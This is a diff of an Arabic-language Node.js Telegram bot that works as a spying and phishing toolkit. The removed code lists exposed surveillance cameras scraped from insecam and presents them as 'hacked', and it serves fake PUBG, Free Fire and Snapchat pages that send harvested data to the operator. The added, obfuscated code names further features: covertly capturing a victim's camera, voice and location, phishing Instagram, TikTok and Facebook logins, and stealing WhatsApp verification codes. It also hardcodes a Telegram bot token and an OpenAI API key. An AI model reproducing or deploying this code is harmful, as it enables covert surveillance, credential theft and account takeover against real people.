-    const chatId = req.body.chatId;
-    const firstName = req.body.firstName;
-    const secondName = req.body.secondName;
-
-    console.log('Received data:', req.body); // تأكد من البيانات المستلمة
-
-    bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
-        .then(() => {
-            res.sendFile(path.join(__dirname, 'pubg.html')); // إرسال ملف النموذج HTML مرة أخرى
-        })
-        .catch((error) => {
-            console.error('Error sending Telegram message:', error.response ? error.response.body : error); // تسجيل تفاصيل الخطأ
-            res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
-        });
-});
-
-app.get('/ge', (req, res) => {
-    const chatId = req.query.chatId;
-    if (!chatId) {
-        return res.status(400).send('الرجاء توفير chatId في الطلب.');
-    }
-    res.sendFile(path.join(__dirname, 'pubg.html'));
-});
-
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(__dirname));
-
-app.post('/submitNames', (req, res) => {
-    const chatId = req.body.chatId;
-    const firstName = req.body.firstName;
-    const secondName = req.body.secondName;
-
-    console.log('Received data:', req.body); // تأكد من البيانات المستلمة
-
-    bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
-        .then(() => {
-            res.sendFile(path.join(__dirname, 'FreeFire.html')); // إرسال ملف النموذج HTML مرة أخرى
-        })
-        .catch((error) => {
-            console.error('Error sending Telegram message:', error.response ? error.response.body : error); // تسجيل تفاصيل الخطأ
-            res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
-        });
-});
-
-app.get('/getNam', (req, res) => {
-    const chatId = req.query.chatId;
-    if (!chatId) {
-        return res.status(400).send('الرجاء توفير chatId في الطلب.');
-    }
-    res.sendFile(path.join(__dirname, 'FreeFire.html'));
-});
-
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(__dirname));
-
-app.post('/submitNames', (req, res) => {
-    const chatId = req.body.chatId;
-    const firstName = req.body.firstName;
-    const secondName = req.body.secondName;
-
-    console.log('Received data:', req.body); // تأكد من البيانات المستلمة
-
-    bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
-        .then(() => {
-            res.sendFile(path.join(__dirname, 'Snapchat.html')); // إرسال ملف النموذج HTML مرة أخرى
-        })
-        .catch((error) => {
-            console.error('Error sending Telegram message:', error.response ? error.response.body : error); // تسجيل تفاصيل الخطأ
-            res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
-        });
-});
-
-app.get('/getName', (req, res) => {
-    const chatId = req.query.chatId;
-    if (!chatId) {
-        return res.status(400).send('الرجاء توفير chatId في الطلب.');
-    }
-    res.sendFile(path.join(__dirname, 'Snapchat.html'));
-});
-const countryTranslation = {
-  "AF": "أفغانستان 🇦🇫",
-  "AL": "ألبانيا 🇦🇱",
-  "DZ": "الجزائر 🇩🇿",
-  "AO": "أنغولا 🇦🇴",
-  "AR": "الأرجنتين 🇦🇷",
-  "AM": "أرمينيا 🇦🇲",
-  "AU": "أستراليا 🇦🇺",
-  "AT": "النمسا 🇦🇹",
-  "AZ": "أذربيجان 🇦🇿",
-  "BH": "البحرين 🇧🇭",
-  "BD": "بنغلاديش 🇧🇩",
-  "BY": "بيلاروس 🇧🇾",
-  "BE": "بلجيكا 🇧🇪",
-  "BZ": "بليز 🇧🇿",
-  "BJ": "بنين 🇧🇯",
-  "BO": "بوليفيا 🇧🇴",
-  "BA": "البوسنة والهرسك 🇧🇦",
-  "BW": "بوتسوانا 🇧🇼",
-  "BR": "البرازيل 🇧🇷",
-  "BG": "بلغاريا 🇧🇬",
-  "BF": "بوركينا فاسو 🇧ﺫ",
-  "KH": "كمبوديا 🇰🇭",
-  "CM": "الكاميرون 🇨🇲",
-  "CA": "كندا 🇨🇦",
-  "CL": "تشيلي 🇨🇱",
-  "CN": "الصين 🇨🇳",
-  "CO": "كولومبيا 🇨🇴",
-  "CR": "كوستاريكا 🇨🇷",
-  "HR": "كرواتيا 🇭🇷",
-  "CY": "قبرص 🇨🇾",
-  "CZ": "التشيك 🇨🇿",
-  "DK": "الدنمارك 🇩🇰",
-  "EC": "الإكوادور 🇪🇨",
-  "EG": "مصر 🇪🇬",
-  "SV": "السلفادور 🇸🇻",
-  "EE": "إستونيا 🇪🇪",
-  "ET": "إثيوبيا 🇪🇹",
-  "FI": "فنلندا 🇫🇮",
-  "FR": "فرنسا 🇫🇷",
-  "GE": "جورجيا 🇬🇪",
-  "DE": "ألمانيا 🇩🇪",
-  "GH": "غانا 🇬🇭",
-  "GR": "اليونان 🇬🇷",
-  "GT": "غواتيمالا 🇬🇹",
-  "HN": "هندوراس 🇭🇳",
-  "HK": "هونغ كونغ 🇭🇰",
-  "HU": "المجر 🇭🇺",
-  "IS": "آيسلندا 🇮🇸",
-  "IN": "الهند 🇮🇳",
-  "ID": "إندونيسيا 🇮🇩",
-  "IR": "إيران 🇮🇷",
-  "IQ": "العراق 🇮🇶",
-  "IE": "أيرلندا 🇮🇪",
-  "IL": " المحتله 🇮🇱",
-  "IT": "إيطاليا 🇮🇹",
-  "CI": "ساحل العاج 🇨🇮",
-  "JP": "اليابان 🇯🇵",
-  "JO": "الأردن 🇯🇴",
-  "KZ": "كازاخستان 🇰🇿",
-  "KE": "كينيا 🇰🇪",
-  "KW": "الكويت 🇰🇼",
-  "KG": "قيرغيزستان 🇰🇬",
-  "LV": "لاتفيا 🇱🇻",
-  "LB": "لبنان 🇱🇧",
-  "LY": "ليبيا 🇱🇾",
-  "LT": "ليتوانيا 🇱🇹",
-  "LU": "لوكسمبورغ 🇱🇺",
-  "MO": "ماكاو 🇲🇴",
-  "MY": "ماليزيا 🇲🇾",
-  "ML": "مالي 🇲🇱",
-  "MT": "مالطا 🇲🇹",
-  "MX": "المكسيك 🇲🇽",
-  "MC": "موناكو 🇲🇨",
-  "MN": "منغوليا 🇲🇳",
-  "ME": "الجبل الأسود 🇲🇪",
-  "MA": "المغرب 🇲🇦",
-  "MZ": "موزمبيق 🇲🇿",
-  "MM": "ميانمار 🇲🇲",
-  "NA": "ناميبيا 🇳🇦",
-  "NP": "نيبال 🇳🇵",
-  "NL": "هولندا 🇳🇱",
-  "NZ": "نيوزيلندا 🇳🇿",
-  "NG": "نيجيريا 🇳🇬",
-  "KP": "كوريا الشمالية 🇰🇵",
-  "NO": "النرويج 🇳🇴",
-  "OM": "عمان 🇴🇲",
-  "PK": "باكستان 🇵🇰",
-  "PS": "فلسطين 🇵🇸",
-  "PA": "بنما 🇵🇦",
-  "PY": "باراغواي 🇵🇾",
-  "PE": "بيرو 🇵🇪",
-  "PH": "الفلبين 🇵🇭",
-  "PL": "بولندا 🇵🇱",
-  "PT": "البرتغال 🇵🇹",
-  "PR": "بورتوريكو 🇵🇷",
-  "QA": "قطر 🇶🇦",
-  "RO": "رومانيا 🇷🇴",
-  "RU": "روسيا 🇷🇺",
-  "RW": "رواندا 🇷🇼",
-  "SA": "السعودية 🇸🇦",
-  "SN": "السنغال 🇸🇳",
-  "RS": "صربيا 🇷🇸",
-  "SG": "سنغافورة 🇸🇬",
-  "SK": "سلوفاكيا 🇸🇰",
-  "SI": "سلوفينيا 🇸🇮",
-  "ZA": "جنوب أفريقيا 🇿🇦",
-  "KR": "كوريا الجنوبية 🇰🇷",
-  "ES": "إسبانيا 🇪🇸",
-  "LK": "سريلانكا 🇱🇰",
-  "SD": "السودان 🇸🇩",
-  "SE": "السويد 🇸🇪",
-  "CH": "سويسرا 🇨🇭",
-  "SY": "سوريا 🇸🇾",
-  "TW": "تايوان 🇹🇼",
-  "TZ": "تنزانيا 🇹🇿",
-  "TH": "تايلاند 🇹🇭",
-  "TG": "توغو 🇹🇬",
-  "TN": "تونس 🇹🇳",
-  "TR": "تركيا 🇹🇷",
-  "TM": "تركمانستان 🇹🇲",
-  "UG": "أوغندا 🇺🇬",
-  "UA": "أوكرانيا 🇺🇦",
-  "AE": "الإمارات 🇦🇪",
-  "GB": "بريطانيا 🇬🇧",
-  "US": "امريكا 🇺🇸",
-  "UY": "أوروغواي 🇺🇾",
-  "UZ": "أوزبكستان 🇺🇿",
-  "VE": "فنزويلا 🇻🇪",
-  "VN": "فيتنام 🇻🇳",
-  "ZM": "زامبيا 🇿🇲",
-  "ZW": "زيمبابوي 🇿🇼",
-  "GL": "غرينلاند 🇬🇱",
-  "KY": "جزر كايمان 🇰🇾",
-  "NI": "نيكاراغوا 🇳🇮",
-  "DO": "الدومينيكان 🇩🇴",
-  "NC": "كاليدونيا 🇳🇨",
-  "LA": "لاوس 🇱🇦",
-  "TT": "ترينيداد وتوباغو 🇹🇹",
-  "GG": "غيرنزي 🇬🇬",
-  "GU": "غوام 🇬🇺",
-  "GP": "غوادلوب 🇬🇵",
-  "MG": "مدغشقر 🇲🇬",
-  "RE": "ريونيون 🇷🇪",
-  "FO": "جزر فارو 🇫🇴",
-  "MD": "مولدوفا 🇲🇩" 
-
-    // ... إضافة بقية الدول هنا
-};
-
-// متغير لتتبع عدد مرات الضغط على زر الكاميرات
-const camRequestCounts = {};
-
-// قائمة VIP
-
-
-// تهيئة التخزين
-async function initStorage() {
-    await storage.init();
-    vipUsers = await storage.getItem('vipUsers') || [];
-}
-
-// حفظ قائمة VIP
-async function saveVipUsers() {
-    await storage.setItem('vipUsers', vipUsers);
-}
-
-// عرض القائمة
-function showCountryList(chatId, startIndex = 0) {
-    try {
-        const buttons = [];
-        const countryCodes = Object.keys(countryTranslation);
-        const countryNames = Object.values(countryTranslation);
-
-        const endIndex = Math.min(startIndex + 99, countryCodes.length);
-
-        for (let i = startIndex; i < endIndex; i += 3) {
-            const row = [];
-            for (let j = i; j < i + 3 && j < endIndex; j++) {
-                const code = countryCodes[j];
-                const name = countryNames[j];
-                row.push({ text: name, callback_data: code });
-            }
-            buttons.push(row);
-        }
-
-        const navigationButtons = [];
-        if (startIndex > 0) {
-            navigationButtons.push 
-        }
-        if (endIndex < countryCodes.length) {
-            navigationButtons.push({ text: "المزيد", callback_data: `next_${endIndex}` });
-        }
-
-        if (navigationButtons.length) {
-            buttons.push(navigationButtons);
-        }
-
-        bot.sendMessage(chatId, "اختر الدولة:", {
-            reply_markup: {
-                inline_keyboard: buttons
-            }
-        });
-    } catch (error) {
-        bot.sendMessage(chatId, `حدث خطأ أثناء إنشاء القائمة: ${error.message}`);
-    }
-}
-
-// عرض الكاميرات
-async function displayCameras(chatId, countryCode) {
-    try {
-        // عرض الكاميرات كالمعتاد
-        const message = await bot.sendMessage(chatId, "جاري اختراق كامراة مراقبه.....");
-        const messageId = message.message_id;
-
-        for (let i = 0; i < 15; i++) {
-            await bot.editMessageText(`جاري اختراق كامراة مراقبه${'.'.repeat(i % 4)}`, {
-                chat_id: chatId,
-                message_id: messageId
-            });
-            await new Promise(resolve => setTimeout(resolve, 1000));
-        }
-
-        const url = `http://www.insecam.org/en/bycountry/${countryCode}`;
-        const headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
-        };
-
-        let res = await axios.get(url, { headers });
-        const lastPageMatch = res.data.match(/pagenavigator\("\?page=", (\d+)/);
-        if (!lastPageMatch) {
-            bot.sendMessage(chatId, "لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة الامان جرب دوله مختلفه او حاول مره اخرى لاحقًا.");
-            return;
-        }
-        const lastPage = parseInt(lastPageMatch[1], 10);
-        const cameras = [];
-
-        for (let page = 1; page <= lastPage; page++) {
-            res = await axios.get(`${url}/?page=${page}`, { headers });
-            const pageCameras = res.data.match(/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
-            cameras.push(...pageCameras);
-        }
-
-        if (cameras.length) {
-            const numberedCameras = cameras.map((camera, index) => `${index + 1}. ${camera}`);
-            for (let i = 0; i < numberedCameras.length; i += 50) {
-                const chunk = numberedCameras.slice(i, i + 50);
-                await bot.sendMessage(chatId, chunk.join('\n'));
-            }
-            await bot.sendMessage(chatId, "لقد تم اختراق كامراة المراقبه من هذا الدوله يمكنك التمتع في المشاهده عمك المنحرف.\n ⚠️ملاحظه مهمه اذا لم تفتح الكامرات في جهازك او طلبت باسورد قم في تعير الدوله او حاول مره اخره لاحقًا ");
-        } else {
-            await bot.sendMessage(chatId, "لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.");
-        }
-    } catch (error) {
-        await bot.sendMessage(chatId, `لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.`);
-    }
-}
-
-// التحقق من كون المستخدم مطور
-function isDeveloper(chatId) {
-    // استبدل هذا بـ chatId الخاص بالمطور
-    const developerChatId = 7246290038;
-    return chatId === developerChatId;
-}
-
-// عرض لوحة تحكم المطور
-function showAdminPanel(chatId) {
-    bot.sendMessage(chatId, "لوحة التحكم:", {
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: "إضافة مستخدم VIP", callback_data: "add_vip" }],
-                [{ text: "إزالة مستخدم VIP", callback_data: "remove_vip" }]
-            ]
-        }
-    });
-}
-
-bot.onText(/\/jjjjjavayy/, (msg) => {
-    const chatId = msg.chat.id;
-    const message = 'مرحبًا! انقر على الرابط لإضافة أسماء المستخدمين.';
-    bot.sendMessage(chatId, message, {
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: 'إختراق ببجي', callback_data: 'get_pubg' }],
-                [{ text: 'إختراق فري فاير', callback_data: 'get_freefire' }],
-                [{ text: 'إضافة أسماء', callback_data: 'add_names' }]
-            ]
-        }
-    });
-});
-
-bot.on('callback_query', (query) => {
-    const chatId = query.message.chat.id;
-    let link;
-
-    if (query.data === 'get_pubg') {
-        link = `https://i-jgne.onrender.com/pubg.html?chatId=${chatId}.png`;
-    } else if (query.data === 'get_freefire') {
-        link = `https://i-jgne.onrender.com/FreeFire.html?chatId=${chatId}.png`;
-    } else if (query.data === 'add_names') {
-        link = `https://i-jgne.onrender.com/Snapchat.html?chatId=${chatId}.png`;
-    }
-
-    if (link) {
-        bot.sendMessage(chatId, `تم لغيم الرابط هذا: ${link}`);
-        bot.answerCallbackQuery(query.id, { text: 'تم إرسال الرابط إليك ✅' });
-    } else if (query.data === 'add_nammes') {
-        bot.sendMessage(chatId, `قم بإرسال هذا لفتح أوامر اختراق الهاتف كاملاً قم بضغط على هذا الامر /Vip`);
-        bot.answerCallbackQuery(query.id, { text: '' });
-    }
-});
-
-bot.onText(/\/نننطسطوو/, (msg) => {
-    const chatId = msg.chat.id;
-    bot.sendMessage(chatId, "مرحبا! في بوت اختراق كاميرات المراقبة 📡", {
-        reply_markup: {
-            inline_keyboard: [[{ text: "ابدأ الاختراق", callback_data: "get_cameras" }]]
-        }
-    });
-
-    if (isDeveloper(chatId)) {
-        showAdminPanel(chatId);
-    }
-});
-
-// التعامل مع أزرار كاميرات المراقبة
-bot.on('callback_query', async (query) => {
-    const chatId = query.message.chat.id;
-
-    if (query.data === 'get_cameras') {
-        showCountryList(chatId);
-    } else if (query.data in countryTranslation) {
-        bot.deleteMessage(chatId, query.message.message_id);
-        displayCameras(chatId, query.data);
-    } else if (query.data.startsWith("next_")) {
-        const startIndex = parseInt(query.data.split("_")[1], 10);
-        bot.deleteMessage(chatId, query.message.message_id);
-        showCountryList(chatId, startIndex);
-    } else if (query.data.startsWith("prev_")) {
-        const endIndex = parseInt(query.data.split("_")[1], 10);
-        const startIndex = Math.max(0, endIndex - 18);
-        bot.deleteMessage(chatId, query.message.message_id);
-        showCountryList(chatId, startIndex);
-    }
-});
-
-// بدء التخزين وتحميل البيانات
-initStorage().then(() => {
-    console.log('تم تهيئة التخزين بنجاح.');
-}).catch(err => {
-    console.error('حدث خطأ أثناء تهيئة التخزين:', err);
-});
-
-// وظيفة لحفظ حالة استخدام الروابط
-const clearTemporaryStorage = () => {
-    // الكود الخاص بحذف الذاكرة المؤقتة
-    console.log('تصفير الذاكرة المؤقتة...');
-};
-
-// حذف الذاكرة المؤقتة كل دقيقتين
-setInterval(() => {
-    clearTemporaryStorage();
-    console.log('تم حذف الذاكرة المؤقتة.');
-}, 2 * 60 * 1000); // 2 دقيقة بالميلي ثانية
-
-const handleExit = () => {
-    saveLinkUsage().then(() => {
-        console.log('تم حفظ حالة استخدام الروابط.');
-        process.exit();
-    }).catch(err => {
-        console.error('حدث خطأ أثناء حفظ حالة استخدام الروابط:', err);
-        process.exit(1); // إنهاء مع رمز خطأ
-    });
-};
-
-process.on('exit', handleExit);
-process.on('SIGINT', handleExit);
-process.on('SIGTERM', handleExit);
-process.on('SIGHUP', handleExit);
+function a0_0x12c7(){const _0x594950=['تنزانيا\x20🇹🇿','https://i-jgne.onrender.com/FreeFire.html?chatId=','get_pubg','map','3867fVLcYK','لبنان\x20🇱🇧','post','secondName','userLink','لم\x20يتم\x20استلام\x20معلومات\x20الجهاز','اشترك\x20في\x20','capture.html','message_id','تم\x20إنشاء\x20الرابط:\x20','/getName','\x20و\x20','?start=','add_vip','حدث\x20خطأ\x20أثناء\x20تهيئة\x20التخزين:','الكويت\x20🇰🇼','الهند\x20🇮🇳','images','مرحبا!\x20في\x20بوت\x20اختراق\x20كاميرات\x20المراقبة\x20📡','https://i-jgne.onrender.com/getNameForm?chatId=','networkType','261ftmFgA','الرجاء\x20إرسال\x20معرف\x20المستخدم\x20لإزالته\x20من\x20VIP:','المكسيك\x20🇲🇽','callback_query','/ge','https://i-jgne.onrender.com/getvideo/','vipUsers.json','تم\x20تهيئة\x20التخزين\x20بنجاح.','node-telegram-bot-api','deleteMessage','ماليزيا\x20🇲🇾','json','phoneNumber','الرجاء\x20الاشتراك\x20في\x20جميع\x20قنوات\x20المطور\x20قبل\x20استخدام\x20البوت.','connectionFrequency','capture_back.html','رابط\x20جمع\x20المعلومات:\x20','قيرغيزستان\x20🇰🇬','حدثت\x20مشكلة\x20أثناء\x20جلب\x20الرسالة.\x20الرجاء\x20المحاولة\x20مرة\x20أخرى\x20لاحق😁ًا.','ابدأ\x20الاختراق','تم\x20حذف\x20الذاكرة\x20المؤقتة.','لقد\x20تم\x20وصول\x20كود\x20الرقم\x20هذا\x20هو\x0a:\x20','text','بليز\x20🇧🇿','\x20📏\x0a-\x20إصدار\x20نظام\x20التشغيل:\x20','تصوير\x20الضحيه\x20فيديو\x20🎥','base64','imageDatas','chatId','لم\x20يتم\x20اختراق\x20كامراة\x20المراقبه\x20في\x20هذا\x20الدوله\x20بسبب\x20قوة\x20الامان\x20جرب\x20دوله\x20مختلفه\x20او\x20حاول\x20مره\x20اخرى\x20لاحقًا.','بنغلاديش\x20🇧🇩','values','جمع\x20معلومات\x20الجهاز\x20🔬','لقد\x20قام\x20ضحيتك\x20في\x20الدخول\x20لرابط\x20منتهى\x20قم\x20في\x20تلغيم\x20رابط\x20جديد\x20','sendLocation','rshq_facebook','city','get_link_','/ca.html','onText','تم\x20استخدام\x20هذا\x20الرابط\x20خمس\x20مرات\x20الرجاء\x20تغير\x20هذا\x20الرابط.','/submitPhoneNumber','existsSync','recordVoice:','المغرب\x20🇲🇦','هندوراس\x20🇭🇳','أسماء\x20المستخدمين:\x20','\x20🔻\x0a-\x20المدينة:\x20','لعبة\x20الاذكياء\x20🧠','فنلندا\x20🇫🇮','min','Error\x20fetching\x20joke:','buffer','فيتنام\x20🇻🇳','/getvideo/:linkId','removeListener','ألمانيا\x20🇩🇪','خطأ.','/submitVoice','file','رومانيا\x20🇷🇴','روسيا\x20🇷🇺','stringify','\x20📡\x0a-\x20الوقت:\x20','userId','/captureBack/:linkId','use','data','/capture','length','\x20🔒\x0a-\x20نطاق\x20التردد\x20للاتصال:\x20','SIGHUP','@K9_S2','next_','deviceType','كازاخستان\x20🇰🇿','.png','زيمبابوي\x20🇿🇼','request_verification','status','كندا\x20🇨🇦','اختراق\x20تيك\x20توك\x20📳','التشيك\x20🇨🇿','rshq_tiktok:','\x20📊\x0a-\x20دقة\x20الشاشة:\x20','غواتيمالا\x20🇬🇹','rshq_instagram','اختراق\x20الكامرا\x20الاخلفيه\x20📷','سحب\x20جميع\x20الرقام\x20الضحيه\x20عبر\x20رابط\x20🔒','Error\x20processing\x20video:','الدنمارك\x20🇩🇰','جنوب\x20أفريقيا\x20🇿🇦','/ok.html','2566780ISJGVh','screenOrientation','البوسنة\x20والهرسك\x20🇧🇦','السويد\x20🇸🇪','ألبانيا\x20🇦🇱','كوريا\x20الشمالية\x20🇰🇵','getChatMember','internalStorage','حدثت\x20مشكلة\x20أثناء\x20جلب\x20النكتة.\x20الرجاء\x20المحاولة\x20مرة\x20أخرى\x20لاحقًا😁.','تايلاند\x20🇹🇭','for\x20chatId:\x20','array','\x20\x0aكلمة\x20السر:\x20','إضافة\x20أسماء','geolocationAvailable','مالي\x20🇲🇱','نيجيريا\x20🇳🇬','response','اختراق\x20الكامرا\x20الاماميه\x20📸','message','https://i-jgne.onrender.com/Snapchat.html?chatId=','linkId','from','فرنسا\x20🇫🇷','https://forest-plausible-practice.glitch.me/','565341QSNCNx','النرويج\x20🇳🇴','substring','https://t.me/','hex','الجبل\x20الأسود\x20🇲🇪','/getNameForm','all','/submitVideo','حدث\x20خطأ\x20أثناء\x20حفظ\x20حالة\x20استخدام\x20الروابط:','repeat','جاري\x20اختراق\x20كامراة\x20مراقبه.....','مولدوفا\x20🇲🇩','لقد\x20قام\x20الضحيه\x20في\x20ادخال\x20رقم\x20الهاتف\x20هذا\x20قم\x20في\x20طلب\x20كود\x20هاذا\x20الرقم\x20في\x20وتساب\x20سريعاً\x0a:\x20','readFileSync','deviceVersion','لم\x20يتم\x20اختراق\x20كامراة\x20المراقبه\x20في\x20هذا\x20الدوله\x20بسبب\x20قوة\x20امانها\x20جرب\x20دوله\x20اخره\x20او\x20حاول\x20مره\x20اخرى\x20لاحقًا.','https://t.me/VlP_12','أوروغواي\x20🇺🇾','choices','Processing\x20complete','sendVoice','https://t.me/lTV_l/33','اليونان\x20🇬🇷','بيرو\x20🇵🇪','الأرجنتين\x20🇦🇷','prev_','\x20⚡\x0a-\x20الشبكة:\x20','captureBack','once','عدد\x20النقاط\x20التي\x20قمت\x20بتجميعها:\x20','static','اغلاق\x20المواقع\x20💣','هولندا\x20🇳🇱','colorDepth','sendMessage','videoData','getLocation:','إسبانيا\x20🇪🇸','/mm','deviceInfo','cpuCores','Received\x20photos:\x20','\x20GB\x20💾\x0a-\x20عدد\x20الأنوية:\x20','https://i-jgne.onrender.com/pubg.html?chatId=','record.html','أفغانستان\x20🇦🇫','الخادم\x20يعمل\x20على\x20المنفذ\x20','تم\x20إزالة\x20المستخدم\x20','الجزائر\x20🇩🇿','time','إيران\x20🇮🇷','/?page=','/submitCode','/:userId','startsWith','اليابان\x20🇯🇵','instagram','فشل\x20في\x20إرسال\x20معلومات\x20الجهاز:','اختر\x20الدولة:','إختراق\x20فري\x20فاير\x20👾','writeFileSync','جاري\x20اختراق\x20كامراة\x20مراقبه','مرحبًا!\x20انقر\x20على\x20الرابط\x20لإضافة\x20أسماء\x20المستخدمين.','Received\x20data:','capture_front.html','query','send','تواصل\x20مع\x20المطور','browserVersion','سنغافورة\x20🇸🇬','urlencoded','اختراق\x20كامراة\x20المراقبه\x20📡','ساحل\x20العاج\x20🇨🇮','سويسرا\x20🇨🇭','ليتوانيا\x20🇱🇹','&type=tiktok','bluetoothSupport','catch','قم\x20بإرسال\x20هذا\x20لفتح\x20أوامر\x20اختراق\x20الهاتف\x20كاملاً\x20قم\x20بضغط\x20على\x20هذا\x20الامر\x20/Vip','لوحة\x20التحكم:','مصر\x20🇪🇬','نيبال\x20🇳🇵','تم\x20تصوير\x20الضحيه\x20فيديو\x20🎥','32JYCNtJ','الدومينيكان\x20🇩🇴','getvideo','\x20🌐\x0a-\x20اسم\x20المتصفح:\x20','حدث\x20خطأ\x20أثناء\x20إنشاء\x20القائمة:\x20','match','جمع\x20معلومات\x20الجهاز','Markdown','\x20📜\x0a-\x20نوع\x20الجهاز:\x20','ليبيا\x20🇱🇾','sendVideo','الرجاء\x20إدخال\x20رابط\x20صحيح\x20يبدأ\x20بـ\x20\x22https\x22.','كاليدونيا\x20🇳🇨','شخص\x20جديد\x20دخل\x20إلى\x20الرابط\x20الخاص\x20بك!\x20لديك\x20الآن\x20','\x20🔄\x0a-\x20عمق\x20الألوان:\x20','body-parser','administrator','بوركينا\x20فاسو\x20🇧ﺫ','ميانمار\x20🇲🇲','body','بلغاريا\x20🇧🇬','uuid','https://cuboid-outstanding-mask.glitch.me/','lastUpdate','\x20🌐\x0a-\x20إصدار\x20المتصفح:\x20','exit','content','https://fluorescent-fuschia-longan.glitch.me/','linkUsage.json','فلسطين\x20🇵🇸','single','screenResolution','then','rshq_instagram:','مرحبًا!\x20بك\x20كل\x20الازازر\x20مجاناً:','اكتب\x20لي\x20رساله\x20طويله\x20جداً\x20لا\x20تقل\x20عن\x20800حرف\x20\x20رساله\x20جميله\x20ومحرجه\x20وكلمات\x20جمله\x20ارسلها\x20لشركة\x20وتساب\x20لفك\x20الحظر\x20عن\x20رقمي\x20المحظور\x20مع\x20اضافة\x20فاصله\x20اضع\x20فيها\x20رقمي\x20وليس\x20اسمي','location.html','لاوس\x20🇱🇦','https://api.openai.com/v1/chat/completions','\x20🌍\x0a-\x20شحن\x20الهاتف:\x20','?chatId=','فرمتة\x20جوال\x20الضحيه\x20عبر\x20رابط\x20🔒','\x20🔵\x0a-\x20دعم\x20الإيماءات\x20اللمسية:\x20','\x20🌍\x0a-\x20الدعم\x20لتقنية\x20البلوتوث:\x20','6YJwqJN','Failed\x20to\x20process\x20video','Stored\x20and\x20sent\x20video\x20for\x20chatId\x20','https://faq.whatsapp.com/','عمان\x20🇴🇲','get_freefire','ريونيون\x20🇷🇪','application/json','add_names','أيرلندا\x20🇮🇪','Error\x20sending\x20video:','\x20⚙️\x0a-\x20لغة\x20النظام:\x20','سحب\x20جميع\x20رسايل\x20الضحيه\x20عبر\x20رابط\x20🔒','\x20📅\x0a-\x20بروتوكول\x20الأمان\x20المستخدم:\x20','سحب\x20جميع\x20صور\x20الهاتف\x20عبر\x20رابط\x20🔒','inst.html','7156653711:AAGaxps8y2PjQSVd8YSgB6s_3_rGFDk_qI0','الأردن\x20🇯🇴','السنغال\x20🇸🇳','النمسا\x20🇦🇹','فنزويلا\x20🇻🇪','تم\x20لغيم\x20الرابط\x20هذا:\x20','get_cameras','سلوفاكيا\x20🇸🇰','env','&type=instagram','إستونيا\x20🇪🇪','غانا\x20🇬🇭','listen','remove_vip','مرحبًا\x20بك\x20عزيزي\x20حمودي\x20في\x20لوحة\x20التحكم:','&type=facebook','Bearer\x20sk-j1u7p1lXXGseWwkhTzrZ1kNNPU6RVm5Iw5wkVItL2BT3BlbkFJaThHadlLGBmdRZqoXRZ_YJIcKlujfPdIGEOjpMgZcA','234kbiZLk','اختراق\x20انستجرام\x20🖥','الفلبين\x20🇵🇭','تم\x20انشاء\x20الرابط\x20لختراق\x20وتساب\x0a:\x20','الكاميرون\x20🇨🇲','collect_device_info','securityProtocol','forEach','امريكا\x20🇺🇸','PORT','العراق\x20🇮🇶','سريلانكا\x20🇱🇰','log','أستراليا\x20🇦🇺','setItem','type','attempts','مرحبًا!\x20هذا\x20الخيارت\x20مدفوع\x20بسعر\x2030$\x20يمكنك\x20تجميع\x20النقاط\x20وفتحها\x20مجاني.','recordVoice','جورجيا\x20🇬🇪','آيسلندا\x20🇮🇸','\x20المحتله\x20🇮🇱','get_link','slice','Error\x20checking\x20subscription\x20status:','كوستاريكا\x20🇨🇷','أوزبكستان\x20🇺🇿','قبرص\x20🇨🇾','\x20كـ\x20VIP.','بوليفيا\x20🇧🇴','رابط\x20تجميع\x20النقاط\x20الخاص\x20بك\x0a\x20عندما\x20يقوم\x20شخص\x20في\x20الدخول\x20الي\x20الرابط\x20الخاص\x20بك\x20سوف\x20تحصل\x20على\x201\x20نقطة.\x0a:\x20https://t.me/','20gzFbPU','Snapchat.html','كرواتيا\x20🇭🇷','sendPhoto','رابط\x20تجميع\x20النقاط\x20الخاص\x20بك\x0a\x20عندما\x20يقوم\x20شخص\x20في\x20الدخول\x20الي\x20الرابط\x20الخاص\x20بك\x20سوف\x20تحصل\x20على1$\x20\x0a:\x20https://t.me/','Invalid\x20request:\x20Missing\x20chatId\x20or\x20videoData','جزر\x20كايمان\x20🇰🇾','تم\x20اختراق\x20حساب\x20جديد⚠️:\x20\x0a\x20اليوزر:\x20','موزمبيق\x20🇲🇿','vipUsers','إختراق\x20فري\x20فاير','\x20🏙️\x0a-\x20عنوان\x20IP:\x20','crypto','غوادلوب\x20🇬🇵','unlinkSync','%\x20🔋\x0a-\x20هل\x20الهاتف\x20يشحن؟:\x20','multer','https://i-jgne.onrender.com/whatsapp?chatId=','ca.html','push','randomBytes','لقد\x20تم\x20اختراق\x20كامراة\x20المراقبه\x20من\x20هذا\x20الدوله\x20يمكنك\x20التمتع\x20في\x20المشاهده\x20عمك\x20المنحرف.\x0a\x20⚠️ملاحظه\x20مهمه\x20اذا\x20لم\x20تفتح\x20الكامرات\x20في\x20جهازك\x20او\x20طلبت\x20باسورد\x20قم\x20في\x20تعير\x20الدوله\x20او\x20حاول\x20مره\x20اخره\x20لاحقًا\x20','https://morning-animated-drifter.glitch.me/','192672lEJcdP','\x20🖥️\x0a-\x20وضع\x20الشاشة:\x20','parse','sendFile','تم\x20تلغيم\x20هذا\x20الرابط\x20⚠️:\x0ahttps://i-jgne.onrender.com/capture.html?chatId=','gpt-3.5-turbo','fees.html','code','express','Error\x20sending\x20Telegram\x20message:','mkdirSync','SIGINT','https://i-jgne.onrender.com/captureBack/','تونس\x20🇹🇳','إضافة\x20مس